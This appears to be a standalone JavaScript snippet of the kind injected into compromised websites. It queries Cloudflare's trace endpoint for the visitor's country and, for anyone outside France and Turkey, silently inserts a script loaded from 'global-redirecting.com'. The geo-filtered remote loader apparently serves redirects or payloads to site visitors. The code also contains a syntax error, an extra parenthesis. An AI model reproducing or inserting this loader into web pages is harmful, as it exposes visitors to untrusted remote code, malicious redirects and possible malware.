var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
    if (this.responseText.toLowerCase().indexOf("loc=fr") === -1 && this.responseText.toLowerCase().indexOf("loc=tr") === -1)){
        (function (a, d, j, o) {
             o = a.createElement(d),
                m = a.getElementsByTagName(d)[0];              
             o.src = j + "?d=0&r=" + Math.random();
             m.parentNode.insertBefore(o, m)
        })(document, 'script', 'https://global-redirecting.com/sl/2e72ef55');
    }
}
};
xhttp.open("GET", "https://www.cloudflare.com/cdn-cgi/trace", true);
xhttp.send();
